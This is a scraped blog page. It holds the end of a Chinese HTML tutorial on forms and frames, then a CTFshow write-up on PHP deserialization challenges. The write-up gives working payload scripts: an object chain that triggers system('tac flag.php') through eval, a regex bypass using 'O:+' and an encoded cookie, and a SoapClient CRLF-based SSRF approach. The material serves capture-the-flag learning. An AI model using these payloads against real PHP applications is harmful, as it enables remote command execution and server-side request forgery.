class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>/&gt;</span>男</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span> <span class="attr">checked</span>/&gt;</span>女<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">           爱好：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;basketball&quot;</span> <span class="attr">checked</span> /&gt;</span>篮球</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;football&quot;</span> <span class="attr">checked</span>/&gt;</span>足球</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;earth&quot;</span> /&gt;</span>地球<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">           星座: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;star&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>白羊座<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>金牛座<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>双子座<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>水瓶座<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;5&quot;</span> <span class="attr">selected</span>&gt;</span>摩羯座<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;6&quot;</span>&gt;</span>天蝎座<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                 <span class="tag">&lt;/<span class="name">select</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            备注：<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;remark&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;50&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注 册&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重置&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;这是一个普通按钮&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/29/JavaWeb/image-20220403231749025.png" alt="image-20220403231749025"></p>
<p><img src="/2022/03/29/JavaWeb/image-20220403231803140.png" alt="image-20220403231803140"></p>
<p>注册成功后：</p>
<p><img src="/2022/03/29/JavaWeb/image-20220403230134737.png" alt="image-20220403230134737"></p>
<h2 id="·HTML-frameset-iframe"><a href="#·HTML-frameset-iframe" class="headerlink" title="·HTML frameset-iframe"></a>·HTML frameset-iframe</h2><p><img src="/2022/03/29/JavaWeb/image-20220411222630231.png" alt="image-20220411222630231"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">frameset</span> <span class="attr">rows</span>=<span class="string">&quot;20%,*&quot;</span> &gt;</span> <span class="comment">&lt;!--frameborder=&quot;no&quot; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;frames/top.html&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">frameset</span> <span class="attr">cols</span>=<span class="string">&quot;15%,*&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;frames/left.html&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">frameset</span> <span class="attr">rows</span>=<span class="string">&quot;80%,*&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;frames/main.html&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;frames/bottom.html&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/29/JavaWeb/image-20220411223236395.png" alt="image-20220411223236395"></p>
<p>frameset:表示页面框架，此标签已淘汰，了解</p>
<p>frame表示框架中的具体页面引用</p>
<p>iframe:在一个页面嵌入一个子页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        这里是iframe的内容</span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;frames/top.html&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/29/JavaWeb/image-20220411223746009.png" alt="image-20220411223746009"></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><img src="/2022/03/29/JavaWeb/image-20220411224807182.png" alt="image-20220411224807182"></p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.HTML:是解释型的文本标记语言，不区分大小写</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.html ,head, title ,meta,body ,br ,p,hr ,<span class="keyword">div</span>, table ,form,u,i,b, sup, sub , &amp;nbsp; , span,ul,ol,li,tr,td, th,h1-h6,a, input , <span class="keyword">select</span>, textarea, img</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>-<span class="number">1</span>.html，head，title,meta，body,br,ul,ol,h1-h6，a，img，&amp;nbsp;,p,<span class="keyword">div</span>，span</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>-<span class="number">2</span>. table tr，th,td</span><br><span class="line"><span class="number">2</span>-<span class="number">3</span>. form(action=<span class="string">&#x27;&#x27;</span> ，<span class="function"><span class="keyword">method</span>= &#x27;<span class="title">post</span>&#x27;) </span></span><br><span class="line"><span class="function"><span class="title">input</span> <span class="title">type</span>=&#x27;<span class="title">text</span>,<span class="title">pasword</span>,<span class="title">radio</span>,<span class="title">checkbox</span>, <span class="title">submit</span>,<span class="title">button</span>,<span class="title">reset</span>&#x27; &lt;<span class="title">select</span>&gt;，&lt;<span class="title">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">CTFshow-反序列化</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-20 16:43:04" itemprop="dateCreated datePublished" datetime="2022-03-20T16:43:04+08:00">2022-03-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-05 21:58:39" itemprop="dateModified" datetime="2022-04-05T21:58:39+08:00">2022-04-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>44k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>40 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="反序列化总结"><a href="#反序列化总结" class="headerlink" title="反序列化总结"></a><strong>反序列化总结</strong></h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692?spm=1001.2014.3001.5501">CTF-PHP反序列化</a></p>
<p>当反序列化字符串中，表示属性个数的值大于真实属性个数时，会跳过 <strong>__wakeup</strong> 函数的执行</p>
<p>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。当反序列化时会进入__unserialize中</p>
<h2 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>

<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220320165340021.png" alt="image-20220320165340021"></p>
<p>$user通过cookie验证vip身份。序列化重构</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowuser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=xxxxxx;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=xxxxxx;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshowuser();</span><br><span class="line"><span class="variable">$b</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220320170944009.png" alt="image-20220320170944009"></p>
<p>username≠password</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$b</span> = urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cookie</span>：user=O%<span class="number">3</span>A<span class="number">11</span>%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A<span class="number">3</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">8</span>%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">6</span>%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">8</span>%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">5</span>%<span class="number">3</span>A%<span class="number">22</span>xxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">5</span>%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>试过赋值不同数字但是错误，可能因为类中的username与password的类型是string的原因</p>
<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220320172808000.png" alt="image-20220320172808000"></p>
<p>审计是看到了backDoor类中的eval函数</p>
<p>ctfshowuser类中的destruct中看到<code>$this-&gt;class-&gt;getInfo();</code>。于是想，从<code>ctfshowuser::destruct</code>中引用<code>backdoor::getInfo()</code>，<code>backdoor::code</code>就是变量。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在类中嵌套类，需要初始化，所以使用<code>__construact</code>函数进行初始化赋值，当新建ctfshowuser这个类的时候会class值会被被覆盖为构造函数中的值</p>
<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220320195248036.png" alt="image-20220320195248036"></p>
<p>较上题增加了正则，可以用”+”绕过正则</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(!preg<span class="constructor">_match(&#x27;<span class="operator">/</span>[<span class="params">oc</span>]:\<span class="params">d</span>+:<span class="operator">/</span><span class="params">i</span>&#x27;, $<span class="params">_COOKIE</span>[&#x27;<span class="params">user</span>&#x27;])</span>)&#123;</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\d:  匹配一个数字字符。等价于 [<span class="number">0</span>-<span class="number">9</span>]。</span><br><span class="line"> +:  匹配前面的子表达式一次或多次。例如，<span class="string">&#x27;zo+&#x27;</span> 能匹配 <span class="string">&quot;zo&quot;</span> 以及 <span class="string">&quot;zoo&quot;</span>，但不能匹配 <span class="string">&quot;z&quot;</span>。+ 等价于 &#123;<span class="number">1</span>,&#125;。</span><br><span class="line">/<span class="selector-tag">i</span>:  表示匹配的时候不区分大小写</span><br><span class="line">匹配序列化字符串是否是对象字符串开头：这个正则什么意思呢 就是不想让你出现O:数字这个意思 </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$b</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$e</span>=str_replace(<span class="string">&#x27;O:11&#x27;</span>,<span class="string">&#x27;O:+11&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$f</span>=str_replace(<span class="string">&#x27;O:8&#x27;</span>,<span class="string">&#x27;O:+8&#x27;</span>,<span class="variable">$e</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$f</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个题相对于上个题有个坑点：成员变量的属性变了，不是private，而是public。</p>
<h3 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h3><p>给了flag.php源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">		file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">explode() 函数把字符串打散为数组。</span><br><span class="line">explode(separator,<span class="keyword">string</span>,limit)</span><br><span class="line">separator 	必需。规定在哪里分割字符串。</span><br><span class="line"><span class="keyword">string</span> 	必需。要分割的字符串。</span><br><span class="line"></span><br><span class="line">array_pop() 函数删除数组中的最后一个元素。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220320204232247.png" alt="image-20220320204232247"></p>
<p>反序列化我们传入的vip，执行getflag函数</p>
<p>通过传入的vip进行反序列化，然后调用了<code>getFlag()</code>方法。但是并没有给我们提供类，所以这个题利用的是php原生类SoapClient。当访问一个类不存在的方法时，php会默认调用该类的<code>__call</code>魔术方法，会调用SoapClient类的构造方法，进而达到发包的目的。</p>
<p>php原生类反序列化利用</p>
<p>SoapClient介绍</p>
<pre><code>综述：
php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。
必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。
通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容
</code></pre>
<p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用__call方法，具体详细的信息可以去搜索引擎看看。</p>
<p>此题由于服务器带有cloudfare代理，我们无法通过本地构造XFF头实现绕过，我们需要使用SoapClient与CRLF实现SSRF（服务器端请求伪造）访问<code>127.0.0.1/flag.php</code>,即可绕过cloudfare代理</p>
<p>flag.php这段代码通过<code>x-forwarded-for</code>头部判断原始ip，要求ip为127.0.0.1，并且要求传入token，如果传入的token正确，就会把flag写到flag.txt中。那么就需要给flag.php发满足上述条件的包即可。不过由于限制了ip的来源(没有贴出来，不过应该类似于)：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">xxxxxx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以得使用ssrf(服务器断请求伪造），让服务器内部自己去访问，这就需要结合下面的内容了。 看看后端的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure>

<p>通过传入的vip进行反序列化，然后调用了<code>getFlag()</code>方法。但是并没有给我们提供类，所以这个题利用的是php原生类SoapClient。当访问一个类不存在的方法时，php会默认调用该类的<code>__call</code>魔术方法，会调用SoapClient类的构造方法，进而达到发包的目的。</p>
